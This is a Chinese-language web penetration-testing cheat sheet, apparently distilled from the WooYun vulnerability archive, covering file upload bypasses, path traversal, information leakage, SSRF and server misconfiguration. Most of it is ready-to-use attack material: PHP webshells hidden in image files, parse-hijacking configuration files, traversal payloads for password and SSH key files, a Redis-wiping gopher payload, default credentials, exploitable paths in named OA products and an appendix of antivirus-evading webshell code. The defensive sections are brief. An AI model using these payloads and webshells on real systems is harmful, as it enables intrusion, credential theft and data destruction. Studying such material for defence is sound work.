# Web文件与基础设施安全

> **来源**: 基于WooYun漏洞库88,636个真实漏洞案例提炼，涵盖文件上传(2,711例)、文件遍历/下载(50例深度分析)、信息泄露(7,337例)三大领域。
> **方法论**: WooYun漏洞本质公式 + INTJ式系统分析框架

---

## 一、文件上传漏洞

### 1.1 漏洞本质

```
攻击链: 上传点发现 → 检测绕过 → 路径获取 → 解析利用 → Webshell运行
成功率 = P(绕过检测) × P(获取路径) × P(解析运行)
```

核心矛盾: 功能需求(允许上传) vs 安全需求(限制执行)。大多数防御仅关注"绕过检测"，忽略路径泄露和解析配置。

### 1.2 上传点识别

| 上传点类型 | 频率 | 风险 | 典型路径 |
|-----------|------|------|---------|
| 富文本编辑器 | 42% | 极高 | `/fckeditor/`, `/ewebeditor/`, `/ueditor/` |
| 头像上传 | 18% | 高 | `/upload/avatar/`, `/member/uploadfile/` |
| 附件/文档 | 15% | 高 | `/uploads/`, `/attachment/` |
| 后台功能 | 12% | 极高 | `/admin/upload/`, `/system/upload/` |
| 导入功能 | 5% | 高 | `/import/`, `/excelUpload/` |

编辑器测试路径:

| 编辑器 | 测试路径 | 上传接口 |
|-------|---------|---------|
| FCKeditor | `/FCKeditor/editor/filemanager/browser/default/connectors/test.html` | `/connectors/jsp/connector` |
| eWebEditor | `/ewebeditor/admin/default.jsp` | `/uploadfile/` |
| UEditor | `/ueditor/controller.jsp?action=config` | `/ueditor/controller.jsp` |

### 1.3 绕过技巧 - 扩展名

黑名单绕过速查表:

| 技巧 | PHP | ASP/ASPX | JSP |
|-----|-----|----------|-----|
| 大小写 | `.Php .pHp` | `.Asp .aSp` | `.Jsp .jSp` |
| 双写 | `.pphphp` | `.asaspp` | `.jsjspp` |
| 特殊后缀 | `.php3 .php5 .phtml .phar` | `.asa .cer .cdx` | `.jspx .jspa` |
| 空格/点 | `.php .` | `.asp.` | `.jsp.` |
| ::$DATA | N/A | `.asp::$DATA` | N/A |
| %00截断 | `.php%00.jpg` | `.asp%00.jpg` | `.jsp%00.jpg` |
| 分号(IIS) | N/A | `.asp;.jpg` | N/A |
| 换行(Apache) | `.php\x0a` | N/A | N/A |

白名单绕过方法:

| 技术 | 原理 | 条件 |
|-----|------|------|
| 解析漏洞 | 上传白名单文件但被特殊解析 | IIS/Apache/Nginx漏洞 |
| Apache多后缀 | `shell.php.jpg` 被解析为php | Apache多后缀配置 |
| %00截断 | `shell.php%00.jpg` | PHP < 5.3.4 |
| 配置文件上传 | 上传`.htaccess`/`.user.ini` | 允许txt/配置文件 |
| 图片马+LFI | 上传图片马配合文件包含 | 存在LFI漏洞 |

### 1.4 绕过技巧 - MIME/Content-Type

```
修改Content-Type为以下值即可绕过:
image/jpeg | image/gif | image/png | image/bmp
application/octet-stream (通用)

Burp拦截修改示例:
Content-Disposition: form-data; name="file"; filename="shell.php"
Content-Type: image/jpeg    <-- 关键修改点
```

### 1.5 绕过技巧 - 文件头/内容检测

常见文件Magic Number:

| 类型 | Magic Number(Hex) | ASCII |
|-----|-------------------|-------|
| JPEG | `FF D8 FF` | 无可读ASCII |
| PNG | `89 50 4E 47` | .PNG |
| GIF | `47 49 46 38` | GIF8 |
| BMP | `42 4D` | BM |
| PDF | `25 50 44 46` | %PDF |
| ZIP | `50 4B 03 04` | PK.. |

图片马制作:

```bash
# 方法1: 简单添加文件头
GIF89a<?php system($_POST['cmd']); ?>

# 方法2: 合并文件
copy /b image.gif+shell.php shell.gif      # Windows
cat image.gif shell.php > shell.gif         # Linux

# 方法3: EXIF注入
exiftool -Comment='<?php system($_GET["cmd"]); ?>' image.jpg
```

### 1.6 Web服务器解析漏洞

```
IIS 5.x/6.0:
  目录解析: /shell.asp/1.jpg     -> 解析为ASP
  文件解析: shell.asp;.jpg       -> 解析为ASP
  畸形解析: shell.asp.jpg        -> 可能解析为ASP

Apache:
  多后缀: shell.php.xxx          -> 从右向左解析
  .htaccess: AddType application/x-httpd-php .jpg
  换行解析: shell.php%0a         -> CVE-2017-15715

Nginx:
  畸形解析: /1.jpg/shell.php     -> cgi.fix_pathinfo=1
  空字节: shell.jpg%00.php       -> 老版本漏洞

Tomcat:
  PUT方法: PUT /shell.jsp/       -> CVE-2017-12615
```

### 1.7 配置文件劫持解析

```apache
# .htaccess: 让jpg被解析为PHP
<FilesMatch "\.jpg$">
  SetHandler application/x-httpd-php
</FilesMatch>
```

```ini
# .user.ini (PHP-FPM): 自动包含图片马
auto_prepend_file=/var/www/html/uploads/shell.jpg
```

```xml
<!-- web.config (IIS): 让jpg被FastCGI处理 -->
<handlers>
  <add name="PHP" path="*.jpg" verb="*" modules="FastCgiModule"
       scriptProcessor="C:\php\php-cgi.exe" resourceType="Unspecified" />
</handlers>
```

### 1.8 竞争条件利用

```
原理: 上传后删除存在时间差
利用: 多线程上传+访问,在删除前执行恶意代码
技巧: 恶意文件先生成一个新文件到其他位置,新文件不被清理机制删除
```

### 1.9 防御措施

1. 白名单验证: 只允许特定扩展名(`.jpg .png .gif .pdf`)
2. 多层验证: 扩展名 + MIME(finfo_file) + 文件头 + getimagesize()
3. 文件重命名: `uniqid() + 固定扩展名`，彻底去除原始文件名
4. 禁止执行: 上传目录禁止脚本执行权限
5. 权限最小化: `chmod 0644`，Web用户不可执行
6. 先检后存: 先验证再存储，使用原子操作防竞争条件
7. 路径隐藏: 不返回完整路径，使用CDN或随机化URL

---

## 二、文件遍历与文件包含

### 2.1 漏洞本质

```
用户输入空间 -> [信任边界失效] -> 文件系统空间
核心: 开发者认为"用户输入=文件名"，攻击者利用"用户输入=路径指令"
```

### 2.2 漏洞参数识别

高频参数名(按出现频率):

```
文件类: filename, filepath, path, file, filePath, hdfile, inputFile
下载类: download, down, attachment, attach, doc
读取类: read, load, get, fetch, open, input
模板类: template, tpl, page, include, temp
通用类: url, src, dir, folder, resource, name
```

高危功能点(TOP 5):
1. 文件下载接口 (27次) - `down.php, download.jsp`
2. 文件预览功能 (17次) - `view.php, preview.jsp`
3. 附件管理 (6次) - `attachment.php`
4. 图片加载 (5次) - `pic.php, image.jsp`
5. 日志查看 (4次) - `log.php, viewlog.jsp`

### 2.3 目录遍历Payload

基础遍历:

```bash
../                          # Linux标准
..\..\                       # Windows标准
../../../../../../../etc/passwd
..\..\..\..\..\..\windows\win.ini
```

编码绕过:

```bash
# URL单次编码
%2e%2e%2f  |  %2e%2e%5c  |  ..%2f  |  %2e%2e/

# URL双重编码
%252e%252e%252f  |  ..%252f

# Unicode/UTF-8超长编码 (GlassFish特有)
%c0%ae%c0%ae/%c0%af

# 混合编码
..%2f  |  %2e%2e/  |  ..%c0%af
```

特殊绕过:

```bash
# 空字节截断 (PHP<5.3.4 / Java旧版本)
../../../etc/passwd%00.jpg

# 问号截断
../../../WEB-INF/web.xml%3f

# 路径混淆
....//  |  ....\/  |  ..\/  |  ./../../

# 绝对路径/协议绕过
/etc/passwd
file:///etc/passwd
file://localhost/etc/passwd
```

### 2.4 敏感文件路径速查表

Linux系统:

```bash
/etc/passwd                    # 用户列表(验证首选)
/etc/shadow                    # 密码哈希
/etc/hosts                     # 主机映射
/root/.ssh/id_rsa              # SSH私钥
/root/.bash_history            # 命令历史
/proc/self/environ             # 进程环境变量
/etc/nginx/nginx.conf          # Nginx配置
/etc/my.cnf                    # MySQL配置
```

Windows系统:

```bash
C:\windows\win.ini             # 系统配置(验证首选)
C:\boot.ini                    # 启动配置(XP/2003)
C:\inetpub\wwwroot\web.config  # IIS应用配置
C:\windows\system32\config\sam # SAM数据库
```

Java Web:

```bash
WEB-INF/web.xml                         # 核心配置(验证首选)
WEB-INF/classes/jdbc.properties          # 数据库配置
WEB-INF/classes/applicationContext.xml   # Spring配置
WEB-INF/classes/hibernate.cfg.xml        # Hibernate配置
```

PHP应用:

```bash
config.php | config.inc.php | db.php | conn.php    # 通用配置
wp-config.php                           # WordPress
config_global.php | config_ucenter.php  # Discuz
application/config/database.php         # CodeIgniter
```

ASP.NET:

```bash
web.config                 # 核心配置(含连接字符串)
../web.config              # 上级目录配置
```

### 2.5 防御措施

```python
import os
def safe_file_access(user_input, base_dir):
    # 1. 路径规范化
    full_path = os.path.normpath(os.path.join(base_dir, user_input))
    # 2. 验证在允许目录内
    if not full_path.startswith(os.path.normpath(base_dir)):
        raise SecurityError("Path traversal detected")
    # 3. 白名单扩展名
    # 4. 验证文件存在
    return full_path
```

关键原则: 路径规范化(realpath/normpath) -> 目录边界校验 -> 白名单验证 -> 最小权限运行

---

## 三、信息泄露

### 3.1 漏洞本质

```
信息泄露本质: 攻击面暴露 -> 信任链断裂 -> 纵深渗透
规律: 一个泄露点可导致整条信任链崩溃
      源码 -> 配置 -> 数据库 -> 内网 -> 全部沦陷
```

### 3.2 敏感文件路径字典

版本控制泄露:

```bash
# Git泄露 (检测优先级最高)
/.git/config          # 含远程仓库地址
/.git/HEAD            # 当前分支
/.git/index           # 暂存区索引
/.git/logs/HEAD       # 操作日志

# SVN泄露
/.svn/entries         # SVN 1.6及以下
/.svn/wc.db           # SVN 1.7+ SQLite数据库

# 利用工具: dvcs-ripper, GitHack, svn-extractor
```

备份文件泄露:

```bash
# 压缩包备份 (530例命中)
/wwwroot.rar | /www.zip | /web.rar | /backup.zip | /site.tar.gz
/{domain}.zip | /{domain}.rar

# SQL备份 (136例命中)
/backup.sql | /database.sql | /db.sql | /dump.sql

# 配置备份 (101例命中)
/config.php.bak | /web.config.bak | /.env.bak
/config_global.php.bak
```

配置文件泄露:

```bash
# 通用
/.env | /.env.local | /.env.production
/config.yml | /config.json | /appsettings.json

# PHP
/config.php | /include/config.php | /data/config.php

# Java/Spring
/WEB-INF/web.xml | /WEB-INF/classes/application.properties
/WEB-INF/classes/jdbc.properties

# .NET
/web.config | /connectionStrings.config
```

探针/调试/日志文件:

```bash
# 探针文件
/phpinfo.php | /info.php | /test.php | /probe.php

# 日志文件
/ctp.log | /logs/ctp.log | /debug.log | /storage/logs/

# 管理界面
/phpmyadmin/ | /pma/ | /adminer.php
/swagger-ui.html | /api-docs
/actuator/env                    # Spring Boot
```

### 3.3 探测方法论

```
Phase 1 被动收集: 响应头(Server/X-Powered-By) -> 错误页面 -> robots.txt -> 源码注释/JS
Phase 2 定向探测: 版本控制(.git/.svn) -> 备份文件(域名/日期) -> 敏感路径
Phase 3 搜索引擎: Google Hacking语法
```

Google Hacking速查:

```
site:target.com filetype:sql | filetype:bak | filetype:zip
site:target.com filetype:env | filetype:log
site:target.com inurl:.git | inurl:.svn
site:target.com inurl:phpinfo | intitle:phpinfo
site:target.com "db_password" | "mysql_connect"
```

### 3.4 信息利用链

```
源码泄露   -> 配置文件 -> 数据库凭证 -> 数据库接管 -> 服务器提权
版本控制   -> 源码审计 -> SQL注入等  -> 管理权限   -> 文件上传getshell
配置泄露   -> DB连接串 -> 数据库    -> 用户数据   -> 业务接管
日志泄露   -> Session  -> 身份劫持  -> 业务数据   -> 横向移动
API接口    -> 凭证/密码 -> 解密     -> 批量控制   -> 全面渗透
第三方凭证 -> 短信/OSS -> 验证码    -> 账户接管   -> 数据泄露
```

### 3.5 防御措施

Nginx安全配置:

```nginx
location ~ /\.(git|svn|env|htaccess|htpasswd) { deny all; return 404; }
location ~ \.(bak|sql|log|config|ini|yml)$ { deny all; return 404; }
location ~* /(backup|bak|old|temp|test|dev)/ { deny all; return 404; }
autoindex off;
server_tokens off;
```

Apache安全配置:

```apache
<FilesMatch "\.(git|svn|env|bak|sql|log|config)">
    Order Allow,Deny
    Deny from all
</FilesMatch>
Options -Indexes
ServerSignature Off
```

CI/CD集成: 部署前扫描敏感文件 -> 禁止.git/.svn部署 -> 配置文件加密

---

## 四、SSRF与协议利用

### 4.1 漏洞本质

```
SSRF本质: 服务端代为发起请求,攻击者控制请求目标
风险: 内网探测 -> 内部服务访问 -> 文件读取 -> 命令执行
```

### 4.2 常见触发点

- 文件下载功能中的url参数
- 图片加载/代理功能
- 网页预览/截图功能
- 导入URL功能
- Webhook/回调配置

### 4.3 协议利用

```bash
# file:// - 任意文件读取
file:///etc/passwd
file:///C:/windows/win.ini

# dict:// - 端口探测/服务交互
dict://127.0.0.1:6379/info     # Redis
dict://127.0.0.1:11211/stats   # Memcached

# gopher:// - 构造任意TCP请求
gopher://127.0.0.1:6379/_*1%0d%0a$8%0d%0aflushall

# http:// - 内网探测
http://127.0.0.1:8080
http://169.254.169.254/latest/meta-data/  # 云元数据
```

### 4.4 绕过技巧

```bash
# IP变形绕过
127.0.0.1 -> 0x7f000001 -> 2130706433 -> 017700000001 -> 127.1
# DNS重绑定: 解析到外部IP再快速切换到127.0.0.1
# 短链接/302跳转: 通过外部URL跳转到内网地址
```

### 4.5 防御措施

1. 白名单限制: 限制请求目标域名/IP
2. 协议限制: 仅允许http/https
3. 内网隔离: 禁止请求RFC1918地址和127.0.0.1
4. DNS解析验证: 解析后再次校验IP归属
5. 禁用重定向: 或限制重定向次数并再次校验

---

## 五、服务器配置错误

### 5.1 解析配置错误

| 问题 | 风险 | 检查方法 |
|-----|------|---------|
| IIS 6.0解析漏洞未修复 | `shell.asp;.jpg`可执行 | 上传含分号文件名测试 |
| Nginx cgi.fix_pathinfo=1 | `/img.jpg/.php`解析为PHP | 上传图片访问`/img.jpg/x.php` |
| Apache多后缀解析 | `shell.php.xxx`被解析 | 上传双扩展名文件测试 |
| 上传目录可执行脚本 | Webshell直接运行 | 上传脚本文件测试 |
| 目录列表开启 | 暴露所有文件 | 访问目录URL查看 |

### 5.2 权限配置错误

| 问题 | 风险 | 修复 |
|-----|------|------|
| Web进程高权限运行 | 提权后直接root | 使用低权限用户运行 |
| 上传目录777权限 | 任意写入+执行 | 设置644/755 |
| 配置文件可读 | 凭证泄露 | 移出Web目录,限制权限 |
| 管理后台无IP限制 | 公网可访问 | IP白名单/VPN |

### 5.3 默认配置风险

```bash
# 默认管理后台路径
/admin/ | /manager/ | /console/ | /system/
/phpmyadmin/ | /adminer.php

# 默认凭证 (高频)
admin/admin | admin/123456 | admin/admin123
root/root | test/test

# 默认调试端口
8080 (Tomcat) | 9090 (管理) | 3306 (MySQL外网)
6379 (Redis无密码) | 27017 (MongoDB无认证)
```

### 5.4 Spring Boot Actuator泄露

```bash
/actuator/env          # 环境变量(含密码)
/actuator/configprops  # 配置属性
/actuator/heapdump     # 堆内存转储(含敏感数据)
/actuator/mappings     # 所有URL映射
```

---

## 六、综合实战Checklist

### 6.1 文件上传测试

- [ ] 扫描常见编辑器路径(FCKeditor/eWebEditor/UEditor)
- [ ] 禁用JavaScript测试前端验证
- [ ] 测试扩展名绕过: 大小写/双写/特殊后缀/%00截断/分号截断
- [ ] 修改Content-Type为image/jpeg
- [ ] 添加GIF89a文件头 / 制作图片马
- [ ] 识别服务器类型,测试对应解析漏洞
- [ ] 测试.htaccess/.user.ini上传劫持解析
- [ ] 分析文件命名规则,测试路径爆破
- [ ] 测试竞争条件上传

### 6.2 文件遍历测试

- [ ] 识别文件相关参数(filename/path/file/url/download)
- [ ] 基础遍历: `../../../../../etc/passwd`
- [ ] Windows测试: `..\..\..\..\..\windows\win.ini`
- [ ] Java Web: `../WEB-INF/web.xml`
- [ ] URL编码绕过: `%2e%2e%2f` / 双重编码 `%252e%252e%252f`
- [ ] Unicode绕过: `%c0%ae%c0%ae/`
- [ ] 空字节截断: `../etc/passwd%00.jpg`
- [ ] 绝对路径: `/etc/passwd` / `file:///etc/passwd`

### 6.3 信息泄露扫描

- [ ] 版本控制: `/.git/config` `/.svn/entries` `/.svn/wc.db`
- [ ] 备份文件: `/wwwroot.rar` `/www.zip` `/backup.sql` `/{domain}.zip`
- [ ] 配置备份: `/config.php.bak` `/web.config.bak` `/.env.bak`
- [ ] 环境文件: `/.env` `/.env.production`
- [ ] 探针文件: `/phpinfo.php` `/info.php` `/test.php`
- [ ] 日志文件: `/ctp.log` `/debug.log` `/storage/logs/`
- [ ] 管理界面: `/phpmyadmin/` `/adminer.php` `/swagger-ui.html`
- [ ] Spring Boot: `/actuator/env` `/actuator/heapdump`
- [ ] Google Hacking语法辅助搜索

### 6.4 SSRF测试

- [ ] 识别URL/代理/回调参数
- [ ] 测试file:///etc/passwd协议读取
- [ ] 测试内网地址: http://127.0.0.1:port
- [ ] 云元数据: http://169.254.169.254/latest/meta-data/
- [ ] IP变形绕过: 十六进制/十进制/省略写法
- [ ] DNS重绑定/302跳转绕过

---

## 附录A: 高危CMS漏洞速查

| CMS/系统 | 漏洞类型 | 路径 | 条件 |
|---------|---------|------|------|
| 万户OA ezOffice | 任意上传 | `/defaultroot/dragpage/upload.jsp` | %00截断 |
| 用友协作平台 | 任意上传 | `/oaerp/ui/sync/excelUpload.jsp` | 绕JS+爆破文件名 |
| 金蝶GSiS | 任意上传 | `/kdgs/core/upload/upload.jsp` | 注册用户 |
| 金智教育epstar | 文件遍历 | `/epstar/servlet/RaqFileServer?action=open&fileName=/../WEB-INF/web.xml` | 无需认证 |
| 致远OA | 日志泄露 | `/ctp.log` | 直接访问 |

## 附录B: Webshell免杀技巧速查

```php
$a = 'as'.'sert'; $a($_POST['x']);                    // 变量拼接
array_map('ass'.'ert', array($_POST['x']));            // 回调函数
$f = create_function('', $_POST['x']); $f();           // 动态函数
set_exception_handler('system');                        // 异常处理
throw new Exception($_POST['cmd']);
```

## 附录C: 通用漏洞URL模式

```bash
# PHP文件遍历
/down.php?filename=../../../etc/passwd
/pic.php?url=[base64编码路径]

# JSP文件遍历
/download.jsp?path=../WEB-INF/web.xml
/servlet/RaqFileServer?action=open&fileName=/../WEB-INF/web.xml

# ASP/ASPX文件遍历
/DownLoad.aspx?Accessory=../web.config
/download.ashx?file=../../../web.config

# Resin特有
/resin-doc/resource/tutorial/jndi-appconfig/test?inputFile=/etc/passwd
```

---

> **供应链/云部署/框架CVE** → 已迁移至 [web-deployment-security.md](web-deployment-security.md)
> **CORS/GraphQL/HTTP走私/WebSocket/OAuth** → 已迁移至 [web-modern-protocols.md](web-modern-protocols.md)

*基于WooYun漏洞库(88,636条)提炼 | 仅供安全研究与防御参考*
